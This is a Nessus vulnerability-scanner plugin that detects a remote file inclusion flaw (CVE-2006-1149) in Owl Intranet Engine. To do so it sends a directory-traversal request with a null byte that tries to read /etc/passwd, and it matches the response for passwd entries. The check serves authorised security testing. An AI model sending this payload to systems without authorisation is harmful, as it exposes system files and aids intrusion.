#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(21025);
  script_version("$Revision: 1.18 $");

  script_cve_id("CVE-2006-1149");
  script_bugtraq_id(17021);
  script_osvdb_id(23734);

  script_name(english:"Owl Intranet Engine lib/OWL_API.php xrms_file_root Parameter Remote File Inclusion");
  script_summary(english:"Tries to read /etc/passwd via Owl");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that suffers from a remote
file include vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Owl Intranet Engine, a web-based document
management system written in PHP. 

The version of Owl Intranet Engine on the remote host fails to
sanitize user-supplied input to the 'xrms_file_root' parameter of the
'lib/OWL_API.php' script before using it in a PHP 'require_once'
function.  An unauthenticated attacker may be able to exploit this
issue to view arbitrary files on the remote host or to execute
arbitrary PHP code, possibly taken from third-party hosts." );
  # http://downloads.securityfocus.com/vulnerabilities/exploits/owl_082_xpl.pl
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?98fbcdee" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/03/08");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/03/08");
 script_cvs_date("$Date: 2015/09/24 23:21:19 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:owl:owl_intranet_engine");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/owl", "/intranet", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  file = "../../../../../../../../../../../../etc/passwd";
  w = http_send_recv3(method:"GET",
    item:string(
      dir, "/lib/OWL_API.php?",
      "xrms_file_root=", file, "%00"
    ), 
    port:port
  );
  if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
  res = w[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream" or "failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but passing
    #     remote URLs might still work.
    egrep(string:res, pattern:"main\(.+/etc/passwd\\0/include-locations\.inc.+ failed to open stream") ||
    egrep(string:res, pattern:"Failed opening required '.+/etc/passwd\\0include-locations\.inc'")
  ) {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      contents = res - strstr(res, "<br />");

    if (isnull(contents)) security_hole(port);
    else {
      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        contents
      );
      security_hole(port:port, extra:report);
    }

    exit(0);
  }
}
